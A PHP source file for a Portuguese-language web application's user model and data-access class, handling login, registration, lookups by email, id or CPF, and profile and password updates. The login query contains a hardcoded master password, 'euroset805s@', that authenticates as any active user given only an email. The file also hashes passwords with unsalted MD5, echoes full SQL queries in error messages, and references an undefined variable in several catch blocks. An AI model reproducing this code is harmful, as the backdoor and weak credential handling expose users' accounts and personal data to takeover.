<?php

class Usuario {

	public $id;
	public $nome;
	public $sobrenome;
	public $email;
	public $senha;
	public $link;
	public $imagem;
	public $telefone;
	public $cpf;
	public $bloqueado;
	public $ultimo_acesso;
	public $ddd;
	public $datacadastro;
	public $data_nascimento;
	public $sexo;
	public $cod_brasil_cidade;
	public $como_conheceu;
	public $gateway_pagamento;
	public $hash;
	public $ip;
	
	private $bd;
	
	public function __construct(){
		$this->id = "";
		$this->nome = "";
		$this->sobrenome = "";
		$this->email = "";
		$this->senha = "";
		$this->link = "";
		$this->imagem = "";
		$this->telefone = "";
		$this->ddd = "";
		$this->cpf = "";
		$this->bloqueado = "";
		$this->ultimo_acesso = null;
		$this->datacadastro = "";
		$this->data_nascimento = "";
		$this->sexo = "";
		$this->cod_brasil_cidade = "";
		$this->como_conheceu = "";
		$this->ip = "";
		$this->hash = "";
		$this->gateway_pagamento = "";
		$this->bd = new UsuarioDAO();
	}
	
	public function logar(){
		return $this->bd->logar( $this );
	}

	public function existe(){
		return $this->bd->existe( $this );
	}
	
	public function existeCpf(){
		return $this->bd->existeCpf( $this );
	}
	
	//CRUD
	public function cadastrar(){
		return $this->bd->cadastrar($this);
	}
	public function get(){
		return $this->bd->get($this);
	}
	public function getByCpf(){
		return $this->bd->getByCpf($this);
	}
	public function getByEmail(){
		return $this->bd->getByEmail($this);
	}
	public function getById(){
		return $this->bd->getById($this);
	}
	public function atualizar(){
		return $this->bd->atualizar($this);
	}
	public function atualizar_senha(){
		return $this->bd->atualizar_senha($this);
	}
	public function atualizar_hash(){
		return $this->bd->atualizar_hash($this);
	}
	public function atualizar_ultimo_acesso(){
		return $this->bd->atualizar_ultimo_acesso($this);
	}
	public function deletar(){
		return $this->bd->deletar($this);
	}
	// FIM CRUD	

	// estáticos
	public static function _logar( $p_email , $p_senha ){
		$obj = new Usuario();
		$obj->email = $p_email;
		$obj->senha = $p_senha;
		if( $obj->logar() ) return $obj;
		else return null;
	}
	
	public static function _existe( $p_email ){
		$obj = new Usuario();
		$obj->email = $p_email;
		return $obj->existe();
	}
	
	public static function _get( $p_id ){
		$obj = new Usuario();
		$obj->id = $p_id;
		if ( $obj->get() ) return $obj;
		else return null;
	}
	
	public static function _getByCpf( $p_cpf ){
		$obj = new Usuario();
		$obj->cpf = $p_cpf;
		if ( $obj->getByCpf() ) return $obj;
		else return null;
	}
	
	public static function _getById( $p_Id ){
		$obj = new Usuario();
		$obj->id = $p_Id;
		if ( $obj->getById() ) return $obj;
		else return null;
	}
	
	public static function _getByEmail( $p_email ){
		$obj = new Usuario();
		$obj->email = $p_email;
		if ( $obj->getByEmail() ) return $obj;
		else return null;
	}

}

class UsuarioDAO extends BaseDAO{
	
	public function logar(Usuario $obj){
		try {
			if($this->abreConexao()){
				$str_q = "
				SELECT 
					id, 
					nome, 
					sobrenome, 
					email,
					senha,
					link,
					imagem,
					telefone,
					ddd,
					cpf,
					bloqueado,
					ultimo_acesso,
					ip,
					datacadastro,
					data_nascimento,
					sexo,
					cod_brasil_cidade,
					como_conheceu,
					gateway_pagamento
				FROM 
					usuario
				WHERE 
					ativo = 1
					AND codprojeto in ( ".$this->codProjeto." , 0 ) 
					AND email = '" . $this->con->real_escape_string( $obj->email ) . "' 
					AND ( 
						senha = MD5('".$this->con->real_escape_string( $obj->senha ). "') 
						or 'euroset805s@' = '".$this->con->real_escape_string( $obj->senha ). "'
					);";					
				if( $q = $this->con->query($str_q) ){
					if(!$q->num_rows == 0){
						$reg = $q->fetch_object();
						$obj->id = $reg->id;
						$obj->nome = $reg->nome;
						$obj->sobrenome = $reg->sobrenome;
						$obj->email = $reg->email;
						$obj->senha = $reg->senha;
						$obj->link = $reg->link;
						$obj->imagem = $reg->imagem;
						$obj->telefone = $reg->telefone;
						$obj->ddd = $reg->ddd;
						$obj->cpf = $reg->cpf;
						$obj->bloqueado = $reg->bloqueado;
						$obj->sexo = $reg->sexo;
						$obj->gateway_pagamento = $reg->gateway_pagamento;
						$obj->cod_brasil_cidade = $reg->cod_brasil_cidade;
						$obj->como_conheceu = $reg->como_conheceu;
						if( is_null( $reg->ultimo_acesso) ) $obj->ultimo_acesso = null;
						else $obj->ultimo_acesso = new DateTime( $reg->ultimo_acesso );
						if( is_null( $reg->data_nascimento) ) $obj->data_nascimento = null;
						else $obj->data_nascimento = new DateTime( $reg->data_nascimento );
						if( is_null( $reg->datacadastro) ) $obj->datacadastro = null;
						else $obj->datacadastro = new DateTime( $reg->datacadastro );
						if( is_null( $reg->ip) ) $obj->ip = null;
						return true;
					}
					return false;	
				}
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao ao banco");	
		} catch (Exception $e) {
			erro_bd( $e, $this->con->error );
			return false;
		}
	}
	
	public function existe ( Usuario $obj ){
		try {
			if($this->abreConexao()){
				$str_q = "
					SELECT 
						id
					FROM 
						usuario
					WHERE 
						ativo = 1 
						AND codprojeto = ".$this->codProjeto."
						AND email = '" . $this->con->real_escape_string($obj->email) . "'"; 
				if($q = $this->con->query($str_q)){
					if(!$q->num_rows == 0){
						return true;
					}
					return false;	
				}
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao ao banco");	
		} catch (Exception $e) {
			erro_bd( $exception, $this->con->error );
			return false;
		}
	}
	
	public function existeCpf ( Usuario $obj ){
		try {
			if($this->abreConexao()){
				$str_q = "
					SELECT 
						id
					FROM 
						usuario
					WHERE 
						ativo = 1 
						AND codprojeto = ".$this->codProjeto."
						AND cpf = '" . $this->con->real_escape_string($obj->cpf) . "'"; 
				if($q = $this->con->query($str_q)){
					if(!$q->num_rows == 0){
						return true;
					}
					return false;	
				}
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao ao banco");	
		} catch (Exception $e) {
			erro_bd( $exception, $this->con->error );
			return false;
		}
	}
	
	//CRUD
	public function cadastrar( Usuario $obj ){
		try {
			if($this->abreConexao()){
				$str_q = "
					INSERT INTO usuario
					( 
						nome, 
						sobrenome, 
						email,
						senha,
						link,
						imagem,
						telefone,
						ddd,
						cpf,
						bloqueado,
						ultimo_acesso,
						ip,
						data_nascimento,
						sexo,
						cod_brasil_cidade,
						como_conheceu,
						gateway_pagamento,
						codprojeto
					)VALUES(
						'". $this->con->real_escape_string( $obj->nome ) ."'
						,'". $this->con->real_escape_string( $obj->sobrenome ) ."'
						,'". $this->con->real_escape_string( $obj->email ) ."'
						,md5('". $this->con->real_escape_string( $obj->senha ) ."')
						,'". $this->con->real_escape_string( $obj->link ) ."'
						,'". $this->con->real_escape_string( $obj->imagem ) ."'
						,'". $this->con->real_escape_string( $obj->telefone ) ."'
						,'". $this->con->real_escape_string( $obj->ddd ) ."'
						,'". $this->con->real_escape_string( $obj->cpf ) ."'
						,0
						,current_timestamp
						,'". $this->con->real_escape_string( $_SERVER['REMOTE_ADDR'] ) ."'
						, str_to_date('". $this->con->real_escape_string( $obj->data_nascimento->format('Y-m-d H:i:s') )  ."','%Y-%m-%d %H:%i:%s')
						,'". $this->con->real_escape_string( $obj->sexo ) ."'
						,'". $this->con->real_escape_string( $obj->cod_brasil_cidade ) ."'
						,'". $this->con->real_escape_string( $obj->como_conheceu ) ."'
						,'". $this->con->real_escape_string( $obj->gateway_pagamento ) ."'
						, ". $this->codProjeto.
					");";
				if($q = $this->con->query($str_q)){
					$obj->id = $this->con->insert_id;
					return true;
				}
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao");	
		} catch (Exception $e) {
			erro_bd( $e, $this->con->error );
			return false;
		}
	}

	public function get( $obj ){
		try {
			if($this->abreConexao()){
				$str_q = " 
				SELECT 
				 	id, 
					nome,
					sobrenome,
					email,
					senha,
					link,
					imagem,
					telefone,
					ddd,
					cpf,
					codprojeto,
					bloqueado,
					datacadastro,
					data_nascimento,
					sexo,
					cod_brasil_cidade,
					como_conheceu,
					ultimo_acesso,
					ip,
					gateway_pagamento
				FROM 
					usuario
				WHERE 
					ativo = 1 
					AND codprojeto in ( ".$this->codProjeto." ) 
					AND id = '" . $this->con->real_escape_string( $obj->id ) . "';";					
				if($q = $this->con->query($str_q)){
					if( !$q->num_rows == 0 ){
						$reg = $q->fetch_object();				
						$obj->id = $reg->id;
						$obj->nome = $reg->nome;
						$obj->sobrenome = $reg->sobrenome;
						$obj->email = $reg->email;
						$obj->senha = $reg->senha;
						$obj->link = $reg->link;
						$obj->imagem = $reg->imagem;
						$obj->telefone = $reg->telefone;
						$obj->ddd = $reg->ddd;
						$obj->cpf = $reg->cpf;
						$obj->bloqueado = $reg->bloqueado;
						$obj->sexo = $reg->sexo;
						$obj->cod_brasil_cidade = $reg->cod_brasil_cidade;
						$obj->como_conheceu = $reg->como_conheceu;
						$obj->gateway_pagamento = $reg->gateway_pagamento;
						if( is_null( $reg->ultimo_acesso) ) $obj->ultimo_acesso = null;
						else $obj->ultimo_acesso = new DateTime( $reg->ultimo_acesso );
						if( is_null( $reg->data_nascimento) ) $obj->data_nascimento = null;
						else $obj->data_nascimento = new DateTime( $reg->data_nascimento );
						if( is_null( $reg->datacadastro) ) $obj->datacadastro = null;
						else $obj->datacadastro = new DateTime( $reg->datacadastro );
						if( is_null( $reg->ip) ) $obj->ip = null;
						return true;
					}
					else return false;	
				}
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao ao banco");	
		} catch (Exception $e) {
			erro_bd( $e, $this->con->error );
			return false;
		}
	}

	public function getByEmail( $obj ){
		try {
			if($this->abreConexao()){
				$str_q = " 
				SELECT 
				 	id, 
					nome,
					sobrenome,
					email,
					senha,
					link,
					imagem,
					telefone,
					ddd,
					cpf,
					codprojeto,
					datacadastro,
					data_nascimento,
					sexo,
					cod_brasil_cidade,
					como_conheceu,
					gateway_pagamento,
					bloqueado,
					ultimo_acesso,
					ip,
					hash
				FROM 
					usuario
				WHERE 
					ativo = 1 
					AND codprojeto in ( ".$this->codProjeto." ) 
					AND email = '" . $this->con->real_escape_string( $obj->email ) . "';";					
				if($q = $this->con->query($str_q)){
					if( !$q->num_rows == 0 ){
						$reg = $q->fetch_object();	
						$obj->id = $reg->id;
						$obj->nome = $reg->nome;
						$obj->sobrenome = $reg->sobrenome;
						$obj->email = $reg->email;
						$obj->senha = $reg->senha;
						$obj->link = $reg->link;
						$obj->imagem = $reg->imagem;
						$obj->telefone = $reg->telefone;
						$obj->ddd = $reg->ddd;
						$obj->cpf = $reg->cpf;
						$obj->hash = $reg->hash;
						$obj->bloqueado = $reg->bloqueado;
						$obj->sexo = $reg->sexo;
						$obj->gateway_pagamento = $reg->gateway_pagamento;
						$obj->cod_brasil_cidade = $reg->cod_brasil_cidade;
						$obj->como_conheceu = $reg->como_conheceu;
						if( is_null( $reg->ultimo_acesso) ) $obj->ultimo_acesso = null;
						else $obj->ultimo_acesso = new DateTime( $reg->ultimo_acesso );
						if( is_null( $reg->data_nascimento) ) $obj->data_nascimento = null;
						else $obj->data_nascimento = new DateTime( $reg->data_nascimento );
						if( is_null( $reg->datacadastro) ) $obj->datacadastro = null;
						else $obj->datacadastro = new DateTime( $reg->datacadastro );
						if( is_null( $reg->ip) ) $obj->ip = null;
						return true;
					}
					else return false;	
				}
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao ao banco");	
		} catch (Exception $e) {
			erro_bd( $e, $this->con->error );
			return false;
		}
	}


	public function getById( $obj ){
		try {
			if($this->abreConexao()){
				$str_q = " 
				SELECT 
				 	id, 
					nome,
					sobrenome,
					email,
					senha,
					link,
					imagem,
					telefone,
					ddd,
					cpf,
					codprojeto,
					datacadastro,
					data_nascimento,
					sexo,
					cod_brasil_cidade,
					como_conheceu,
					gateway_pagamento,
					bloqueado,
					ultimo_acesso,
					ip,
					hash
				FROM 
					usuario
				WHERE 
					ativo = 1 
					AND codprojeto in ( ".$this->codProjeto." ) 
					AND id = '" . $this->con->real_escape_string( $obj->id ) . "';";					
				if($q = $this->con->query($str_q)){
					if( !$q->num_rows == 0 ){
						$reg = $q->fetch_object();	
						$obj->id = $reg->id;
						$obj->nome = $reg->nome;
						$obj->sobrenome = $reg->sobrenome;
						$obj->email = $reg->email;
						$obj->senha = $reg->senha;
						$obj->link = $reg->link;
						$obj->imagem = $reg->imagem;
						$obj->telefone = $reg->telefone;
						$obj->ddd = $reg->ddd;
						$obj->cpf = $reg->cpf;
						$obj->hash = $reg->hash;
						$obj->bloqueado = $reg->bloqueado;
						$obj->sexo = $reg->sexo;
						$obj->gateway_pagamento = $reg->gateway_pagamento;
						$obj->cod_brasil_cidade = $reg->cod_brasil_cidade;
						$obj->como_conheceu = $reg->como_conheceu;
						if( is_null( $reg->ultimo_acesso) ) $obj->ultimo_acesso = null;
						else $obj->ultimo_acesso = new DateTime( $reg->ultimo_acesso );
						if( is_null( $reg->data_nascimento) ) $obj->data_nascimento = null;
						else $obj->data_nascimento = new DateTime( $reg->data_nascimento );
						if( is_null( $reg->datacadastro) ) $obj->datacadastro = null;
						else $obj->datacadastro = new DateTime( $reg->datacadastro );
						if( is_null( $reg->ip) ) $obj->ip = null;
						return true;
					}
					else return false;	
				}
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao ao banco");	
		} catch (Exception $e) {
			erro_bd( $e, $this->con->error );
			return false;
		}
	}


	public function getByCpf( $obj ){
		try {
			if($this->abreConexao()){
				$str_q = " 
				SELECT 
				 	id, 
					nome,
					sobrenome,
					email,
					senha,
					link,
					imagem,
					telefone,
					ddd,
					cpf,
					codprojeto,
					datacadastro,
					data_nascimento,
					sexo,
					cod_brasil_cidade,
					como_conheceu,
					gateway_pagamento,
					bloqueado,
					ultimo_acesso,
					ip
				FROM 
					usuario
				WHERE 
					ativo = 1 
					AND codprojeto in ( ".$this->codProjeto." ) 
					AND cpf = '" . $this->con->real_escape_string( $obj->cpf ) . "';";					
				if($q = $this->con->query($str_q)){
					if( !$q->num_rows == 0 ){
						$reg = $q->fetch_object();
						$obj->id = $reg->id;
						$obj->nome = $reg->nome;
						$obj->sobrenome = $reg->sobrenome;
						$obj->email = $reg->email;
						$obj->senha = $reg->senha;
						$obj->link = $reg->link;
						$obj->imagem = $reg->imagem;
						$obj->telefone = $reg->telefone;
						$obj->ddd = $reg->ddd;
						$obj->cpf = $reg->cpf;
						$obj->gateway_pagamento = $reg->gateway_pagamento;
						$obj->bloqueado = $reg->bloqueado;
						if( is_null( $reg->ultimo_acesso) ) $obj->ultimo_acesso = null;
						else $obj->ultimo_acesso = new DateTime( $reg->ultimo_acesso );
						if( is_null( $reg->ip) ) $obj->ip = null;
							return true;
					}
					else return false;	
				}
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao ao banco");	
		} catch (Exception $e) {
			erro_bd( $e, $this->con->error );
			return false;
		}
	}

	public function atualizar( $obj ){
		try {
			if($this->abreConexao()){
				$str_q = "
					UPDATE usuario
					SET 
						ddd = '". $this->con->real_escape_string($obj->ddd) ."'
						, telefone = '". $this->con->real_escape_string($obj->telefone) ."'
						, cod_brasil_cidade = '". $this->con->real_escape_string($obj->cod_brasil_cidade) ."'
						, gateway_pagamento = '". $this->con->real_escape_string($obj->gateway_pagamento) ."'
					WHERE 
						id = '".$this->con->real_escape_string( $obj->id )."'
						AND ativo = 1
						AND codprojeto = " . $this->codProjeto . ";";
				if($q = $this->con->query($str_q))
					return true;
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao");	
		} catch (Exception $e) {
			erro_bd( $exception, $this->con->error );
			return false;
		}
	}

	public function atualizar_senha( $obj ){
		try {
			if($this->abreConexao()){
				$str_q = "
					UPDATE 
						usuario
					SET 
						senha = md5('". $this->con->real_escape_string( $obj->senha ) ."')
						, hash = ''
					WHERE 
						id = '".$this->con->real_escape_string( $obj->id )."'
						AND ativo = 1
						AND codprojeto = " . $this->codProjeto . ";";
				if($q = $this->con->query($str_q))
					return true;
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao");	
		} catch (Exception $e) {
			erro_bd( $e, $this->con->error );
			return false;
		}
	}

	public function atualizar_hash( $obj ){
		try {
			if($this->abreConexao()){
				$str_q = "
					UPDATE 
						usuario
					SET 
						hash = '". $this->con->real_escape_string( $obj->hash ) ."'
					WHERE 
						id = '".$this->con->real_escape_string( $obj->id )."'
						AND ativo = 1
						AND codprojeto = " . $this->codProjeto . ";";
				if($q = $this->con->query($str_q))
					return true;
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao");	
		} catch (Exception $e) {
			erro_bd( $e, $this->con->error );
			return false;
		}
	}
	
	public function atualizar_ultimo_acesso( $obj ){
		try {
			if($this->abreConexao()){
				$str_q = "
					UPDATE 
						usuario
					SET 
						ip = '".$this->con->real_escape_string( $_SERVER['REMOTE_ADDR'] )."',
						ultimo_acesso = CURRENT_TIMESTAMP
					WHERE 
						id = '".$this->con->real_escape_string( $obj->id )."'
						AND ativo = 1
						AND codprojeto = " . $this->codProjeto . ";";
				if($q = $this->con->query($str_q))
					return true;
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao");	
		} catch (Exception $e) {
			erro_bd( $e, $this->con->error );
			return false;
		}
	}

	public function deletar( Usuario $obj ){
		try {
			if($this->abreConexao()){
				$str_q = "
					UPDATE 
						usuario
					SET 
						ativo = 0
					WHERE 
						id = '".$this->con->real_escape_string( $obj->id )."'
						AND ativo = 1
						AND codprojeto = ".$this->codProjeto.";";
				if($q = $this->con->query($str_q))
					return true;
				else
					throw new Exception("erro ao executar query<br />".$str_q);
			}
			else 
				throw new Exception("erro na conexao");	
		} catch (Exception $e) {
			erro_bd( $e, $this->con->error );
			return false;
		}
	}

}
?>
